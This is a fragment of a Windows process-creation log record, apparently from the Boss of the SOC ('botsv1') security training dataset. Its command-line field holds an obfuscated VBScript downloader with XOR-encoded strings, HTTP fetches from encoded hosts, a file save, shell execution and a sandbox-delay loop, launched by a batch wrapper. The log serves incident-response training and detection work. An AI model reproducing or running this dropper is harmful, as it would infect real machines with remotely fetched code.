UPhqZ=CREAteOBJecT(A9y(\"332A7B05156A211A46243629\",KbcT))\" \"Gs0g=3\" \"UPhqZ.OpEn\" \"TF1=68\" \"UPhqZ.tyPE=6867-6866\" \"RDjmY=24\" \"UPhqZ.wrITe FaddNPJ\" \"WiFgvS=78\" \"UPhqZ.SaVeTOfIle RWRL,8725-8723\" \"AF=4\" \"UPhqZ.closE\" \"JC7sf2=1\" \"Cke4e\" \"JM=88\" \"EnD suB\" \"fuNCtIoN Yq(PDqi1)\" \"I0=22\" \"DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK\" \"GJDnbE=32\" \"On ErrOR reSume NeXT\" \"B7bT=1\" \"Uv=\"Tk\"\" \"ELw=73\" \"sEt YTwwO=CREaTeObjeCT(A9y(\"3C07082602241F7A383C0E3807\",Uv))\" \"K4=62\" \"GAiF\" \"IS1cj=19\" \"Set Dzc0=YTwwO.eNVIrONMEnt(A9y(\"013B183400023A\",\"EQiWw\"))\" \"D9S=38\" \"RWRL=Dzc0(A9y(\"14630811720C14\",\"XU3\"))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF\" \"AtCQ=95\" \"JiYwVG=\"FcQqQ\"\" \"Tf=79\" \"sEt BAU7Cz=CrEATEoBjECT(A9y(\"2E38122329103E1725683B1C3D19123701\",JiYwVG))\" \"QUY=56\" \"BAU7Cz.OpeN A9y(\"0D0E1E\",\"KJ\"),PDqi1,7387-7387\" \"JX2=58\" \"BAU7Cz.SeTReQuEstHeAdeR A9y(\"1F59242828\",\"OM8J\"),A9y(\"0D354C3D356B567A0F6B6B\",\"VoL8XF\")\" \"URkT=71\" \"BAU7Cz.SEnD()\" \"QdFeA6=65\" \"if BAU7Cz.StaTUstExt=A9y(\"652840353A542512023C5B3D572F27\",\"S5I2A\") then\" \"PwTLW23=36\" \"GAiF\" \"R4xYBS=63\" \"MA(4)\" \"PjL6m=46\" \"GKfD3aY BAU7Cz.ReSpONSEbody\" \"Fj98=72\" \"Else\" \"D7T=91\" \"IK=\"NNXFD0\"\" \"NK=74\" \"SeT BAU7Cz= CreATeobJECT(A9y(\"033125365F3D213E326A68030210121060\",IK))\" \"QJ=35\" \"BAU7Cz.oPeN A9y(\"2A2F0E\",\"TmjZ8d\"),A9y(\"07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26\",\"Ao\" ),5022-5022\" \"UMp8=85\" \"BAU7Cz.SeTReqUesTheadER A9y(\"1439190A24\",\"AFXwm\"),A9y(\"371038301A716C5F7B6644\",\"LUi\")\" \"NluUc=93\" \"BAU7Cz.SENd()\" \"EOtR=44\" \"If BAU7Cz.STaTUSTexT=A9y(\"03510A3B3A51146F105F163B365E0C\",\"OS0x\") THen GKfD3aY BAU7Cz.REsPOnSeBODY\" \"Q6sMEZ=54\" \"I9Nl7=56\" \"end if\" \"Dq=54\" \"eND FuNCTioN\" \"fUNctIon OyVNo(U1,Brt0d)\" \"SNOW=59\" \"OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)\" \"QTi5K=54\" \"enD funcTION\" \"Sub Cke4e()\" \"WTOyAw=62\" \"dIM EuM,WIbud,NCiN,Fs8HJ\" \"A5AT=92\" \"NCiN=\"\"\"\"\" \"SX6=93\" \"WIbud=RWRL &amp; Ql9zEF &amp; A9y(\"4A330F3F\",\"WdGbOGp\")\" \"V5B7Zh=92\" \"M1p67jL RWRL,WIbud\" \"L13=45\" \"iF Fs8HJ=\"\" tHen MA(4)\" \"CHaK=38\" \"EuM=\"Iqxkf\"\" \"U56m=67\" \"SEt VP=creATeoBJEcT(A9y(\"262B081420010C453521141407\",EuM))\" \"U5Quw=85\" \"VP.Run A9y(\"1023287B163629755C0D6C06270F1E01536C6E7551\",\"UsNL\") &amp; WIbud &amp; NCiN,2912-2912,5755-5755\" \"A6mfcYL=76\" \"End sUB\" \"JoxZ3=43\" \"AylniN\" \"suB GAiF()\" \"G4vzM=95\" \"Dim DCRml9g, CjoNOY9\" \"For DCRml9g = 68 To 6000327\" \"CjoNOY9 = Rvwr + 23 + 35 + 27\" \"Next\" \"KK0H=46\" \"enD sUb\") do @echo %~i)&gt;\"!GSI!\" &amp;&amp; start \"\" \"!GSI!\"","ProcessGuid":"{0F2D76F0-CEA9-57BD-0000-0010C8133100}","ProcessId":"3968","CurrentDirectory":"D:\\","Hashes":"SHA1=860265276B29B42B8C4B077E5C651DEF9C81B6E9,MD5=D1AB72DB2BEDD2F255D35DA3DA0D4B16,SHA256=047F3C5A7AB0EA05F35B2CA8037BF62DD4228786D07707064DBD0D46569305D0,IMPHASH=62EA1D2DA2B1481E969D080A6B29D775","IntegrityLevel":"Medium","dataset":"botsv1"}
